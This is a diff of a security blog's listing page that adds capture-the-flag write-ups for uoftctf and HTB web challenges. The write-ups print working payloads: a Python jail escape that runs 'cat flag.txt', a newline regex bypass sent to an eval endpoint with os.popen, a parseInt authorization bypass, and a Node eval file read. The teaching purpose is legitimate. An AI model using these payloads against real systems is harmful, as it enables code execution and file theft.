@@ -101,6 +101,106 @@
 	   
 	<div class="article-header">
 	    
+		<a class="title" href="/2007/12/31/CTF%20-%20uoftctf/">CTF - uoftctf</a>  
+	       
+		 
+
+		<div class="meta">
+			<time>Dec 31, 2007</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<h1 id="Jail-Baby’s-First-PyJail"><a href="#Jail-Baby’s-First-PyJail" class="headerlink" title="Jail - Baby’s First PyJail"></a>Jail - Baby’s First PyJail</h1><blockquote>
+<p>@windex told me that jails should be sourceless. So no source for you.</p>
+</blockquote>
+<p><img src="/images/CTF%20-%20uoftctf/image-20240115164611584.png"></p>
+<p>Certain words are filtered <code>'import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.'</code></p>
+<p>By printing the <code>__builtins__</code></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">dir</span>(__builtins__))</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>, <span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EncodingWarning'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>, <span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>, <span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>, <span class="string">'aiter'</span>, <span class="string">'all'</span>, <span class="string">'anext'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'breakpoint'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>We are still able to use getattr to access the object even though the import is banned. And manipulate the string to avoid the blacklist detections.</p>
+<p>The solution below avoids the black list character and dots.</p>
+<figure class="highlight lisp"><table><tbody><tr><td class="code"><pre><span class="line">getattr(<span class="name">getattr</span>(<span class="name">globals</span>()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat flag.txt')</span><br><span class="line"></span><br><span class="line">Or</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getattr(<span class="name">getattr</span>(<span class="name">globals</span>()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat flag')</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html">https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/326406.html">https://www.freebuf.com/articles/web/326406.html</a>.</p>
+<h1 id="Web-Voice-Changer"><a href="#Web-Voice-Changer" class="headerlink" title="Web - Voice Changer"></a>Web - Voice Changer</h1><blockquote>
+<p>I made a cool app that changes your voice.</p>
+</blockquote>
+<p><img src="/images/CTF%20-%20uoftctf/image-20240115165059839.png"></p>
+<p>It’s a web application to record voice and sent over to server side and will parse by ffmpeg.</p>
+<p><img src="/images/CTF%20-%20uoftctf/image-20240115165150001.png"></p>
+<p>During the analyse phase using burp, the pitch parameter found to be vulnerable to command injections and the result is return back in the output.</p>
+<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165259115.png" class="lazyload"></p>
+<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165323689.png" class="lazyload"></p>
+<h1 id="Web-The-Varsity"><a href="#Web-The-Varsity" class="headerlink" title="Web - The Varsity"></a>Web - The Varsity</h1><blockquote>
+<p>Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue.</p>
+</blockquote>
+<p>Source code is provided, basically after user register, it allows user to view articles.</p>
+<p>According to the source code, the flag is stored at article 10</p>
+<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115172824978.png" class="lazyload"></p>
+<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115172922240.png" class="lazyload"></p>
+<p>However viewing the article 10 requires subscription which the roles is embedded in JWT.</p>
+<p>In this part of code, it provides the POST route for <code>/article</code>.</p>
+<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">"/article"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (token) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> issue = req.<span class="property">body</span>.<span class="property">issue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">issue</span> &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Invalid issue number"</span> });</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (decoded.<span class="property">subscription</span> !== <span class="string">"premium"</span> &amp;&amp; issue &gt;= <span class="number">9</span>) {</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">          .<span class="title function_">status</span>(<span class="number">403</span>)</span><br><span class="line">          .<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Please subscribe to access this issue"</span> });</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      issue = <span class="built_in">parseInt</span>(issue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(issue) || issue &gt; articles.<span class="property">length</span> - <span class="number">1</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Invalid issue number"</span> });</span><br><span class="line">      }</span><br><span class="line">	  <span class="keyword">return</span> res.<span class="title function_">json</span>(articles[issue]);</span><br><span class="line">      ..................</span><br></pre></td></tr></tbody></table></figure>
+
+<p>It seems that there’s some problem with the parseInt.</p>
+<p>Before parseInt, issue have to be less than 9 and after the parseInt we need issue to be less than 10.</p>
+<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115173721478.png" class="lazyload"></p>
+<p>After some research we found that using the scientific notation able us to meet the condition.</p>
+<p>when the value of issue is </p>
+<p>we will craft the issue to be <code>"9.999e-1"</code> which will bypass the first check and after parseint the value of issues will be 9. </p>
+<p>Since the value issue now is 9, it will also bypass the second check, and return <code>res.json(article[9])</code></p>
+<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115183741018.png" class="lazyload"></p>
+<h1 id="Web-No-Code"><a href="#Web-No-Code" class="headerlink" title="Web - No Code"></a>Web - No Code</h1><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/execute'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_code</span>():</span><br><span class="line">    code = request.form.get(<span class="string">'code'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">".*[\x20-\x7E]+.*"</span>, code):</span><br><span class="line">        <span class="keyword">return</span> jsonify({<span class="string">"output"</span>: <span class="string">"jk lmao no code"</span>}), <span class="number">403</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify({<span class="string">"output"</span>: result}), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<p><code>re.match(".*[\x20-\x7E]+.*", code)</code></p>
+<p>This regex is using the <code>re.match()</code> function to check if the <code>code</code> string contains any printable ASCII characters. Let’s break down the components:</p>
+<ul>
+<li><code>.*</code>: Matches any character (except for a newline) zero or more times.</li>
+<li><code>[\x20-\x7E]+</code>: This is a character class that matches one or more characters within the hexadecimal range <code>\x20</code> (space) to <code>\x7E</code> (tilde). This range represents the printable ASCII characters, including letters, digits, punctuation, and some special characters.</li>
+</ul>
+<p>By enter a new line will bypass the check of regex</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\n__builtins__.__import__('os').popen('cat flag.txt').read()"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://uoftctf-no-code.chals.io/execute"</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,data={<span class="string">"code"</span>:payload})</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>{"output":"uoftctf{r3g3x_3p1c_f41L_XDDD}"}</code></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+	</div>
+	
+
+	<div class="article-tags">
+		
+	</div>
+
+	<div class="article-bottom">
+		<a class="readmore" href="/2007/12/31/CTF%20-%20uoftctf/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
 		<a class="title" href="/1998/01/01/HTB-Web-Challenge/">HTB Web Challenge</a>  
 	       
 		 
@@ -120,7 +220,7 @@
 <p>In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑</p>
 </blockquote>
 <p>Poking through the website found it uses <code>eval()</code>, in this case, it is vulnerable directly execute javascript codes</p>
-<p><img src="/images/HTB-Web-Challenge/image-20231211110203037.png"></p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211110203037.png" class="lazyload"></p>
 <p>Take a look at routes, the <code>/api/calculate</code> accept variable called ‘<code>formula</code>‘ and passed it to the <code>calculatorHelp</code> calculator for processing</p>
 <figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path       = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> router     = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Calculator</span> = <span class="built_in">require</span>(<span class="string">'../helpers/calculatorHelper'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">response</span> = data =&gt; ({ <span class="attr">message</span>: data });</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">'views/index.html'</span>));</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">'/api/calculate'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">let</span> { formula } = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (formula) {</span><br><span class="line">		result = <span class="title class_">Calculator</span>.<span class="title function_">calculate</span>(formula);</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(result));</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Missing parameters'</span>));</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ocd</span></span><br></pre></td></tr></tbody></table></figure>
 
@@ -132,12 +232,12 @@
 <p>craft payload in one line would be </p>
 <figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>)</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/HTB-Web-Challenge/image-20231211110904318.png"></p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211110904318.png" class="lazyload"></p>
 <p>However it seems to return an object.</p>
 <p>Modify the parameter for readFileSync to <code>utf8</code></p>
 <figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>,<span class="string">'utf8'</span>)</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/HTB-Web-Challenge/image-20231211111035521.png"></p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211111035521.png" class="lazyload"></p>
 <h1 id="ProxyAsService-Easy"><a href="#ProxyAsService-Easy" class="headerlink" title="ProxyAsService  - Easy"></a>ProxyAsService  - Easy</h1><p><strong>app.py</strong></p>
 <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">app.register_blueprint(proxy_api, url_prefix=<span class="string">'/'</span>)</span><br><span class="line">app.register_blueprint(debug, url_prefix=<span class="string">'/debug'</span>)</span><br></pre></td></tr></tbody></table></figure>
 
@@ -311,6 +411,9 @@
 <p>Next, if the message exist, it will inject the message into database using the method <code>db.insertMessage</code>.</p>
 <p>If the message is successful insert into database, it will trigger a bot to visit the speceific URL </p>
 <figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">"/submit"</span>, <span class="keyword">async</span> (req, res) =&gt; {</span><br><span class="line">    <span class="keyword">const</span> { message } = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message) {</span><br><span class="line">        <span class="keyword">return</span> db.<span class="title function_">insertMessage</span>(message)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="keyword">async</span> inserted =&gt; {</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    botVisiting = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">await</span> <span class="title function_">visit</span>(<span class="string">`http://127.0.0.1/letters?id=<span class="subst">${inserted.lastID}</span>`</span>, authSecret);</span><br><span class="line">                    botVisiting = <span class="literal">false</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">catch</span> (e) {</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">                    botVisiting = <span class="literal">false</span>;</span><br><span class="line">                }</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">201</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(inserted.<span class="property">lastID</span>));</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Something went wrong!'</span>));</span><br><span class="line">            });</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Missing required parameters!'</span>));</span><br><span class="line">});</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<h1 id="Cyber-Apocalypse-2024"><a href="#Cyber-Apocalypse-2024" class="headerlink" title="Cyber Apocalypse 2024"></a>Cyber Apocalypse 2024</h1>
 		  	  
 	</div>
 
@@ -345,7 +448,7 @@
         </a>
     
 
-   <span class="page-number"> Page <strong>5</strong>, Posts <strong>33</strong>. </span>
+   <span class="page-number"> Page <strong>5</strong>, Posts <strong>34</strong>. </span>
 
     
   </nav> 
